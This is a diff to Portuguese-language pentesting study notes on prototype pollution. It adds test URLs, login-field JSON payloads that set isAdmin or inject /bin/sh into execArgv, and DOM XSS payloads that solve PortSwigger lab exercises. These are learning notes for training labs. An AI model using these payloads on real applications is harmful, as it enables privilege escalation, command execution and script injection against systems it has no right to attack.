@@ -9390,10 +9390,12 @@ LABS
 
 Pra saber se um servidor tem falha de prototype pollution, teste enviando dados com __proto__ ou constructor.prototype nos lugares onde o servidor recebe informações — como parâmetros da URL, corpo JSON de uma requisição ou até cabeçalhos. Se depois disso o servidor começar a se comportar de forma estranha, retornar propriedades que você injetou ou der erro, é sinal de que pode estar vulnerável. A falha aparece quando o servidor usa funções perigosas que misturam objetos sem cuidado, como merge() ou cloneDeep() em versões antigas de bibliotecas JavaScript.
 
-Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution
+Alguns payloads que podem ser inseridos nos campos login e senha com o intuito de explorar a vulnerabilidade de protorype pollution. O primeiro payload é para teste, quando rodar, verificar no console o `Object.prototype` e ver se vai modificar o objeto com o nome `foo` e o value `bar`
 
-	EXEMPLO DE LOCAL ONDE PODE SER INSERIDO UM PAYLOAD
+	EXEMPLO DE LOCAL ONDE PODE SER INSERIDO UM PAYLOAD - RODAR NO CONSOLE Object.prototype E VER SE VAI APARECER foo...bar NO OBJETO
 	academy.net/?__proto__[foo]=bar
+	academy.net/?__proto__.foo=bar
+	PAYLOADS PARA LOGIN
 	{\"__proto__\": { \"isAdmin \": true }}
 	{\"__proto__\":{\"execArgv\":[\"/bin/sh\"]}}
 	{\"__proto__\":{\"isAdmin\":true}}
@@ -9421,9 +9423,9 @@ Outros scrpts que podem ser utilizados
 
 LABS
 
-[DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution)
+[DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-client-side-prototype-pollution) PAYLOAD `?__proto__[transport_url]=data:,alert(1);` JS com a propriedade do transport_url nao definida pro objet config 
 
-[DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector)
+[DOM XSS via an alternative prototype pollution vector](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-via-an-alternative-prototype-pollution-vector) PAYLOAD `?__proto__.sequence=alert(1)` COM EVAL no JS que não ta definido
 
 [Client-side prototype pollution via flawed sanitization](https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-client-side-prototype-pollution-via-flawed-sanitization)
 
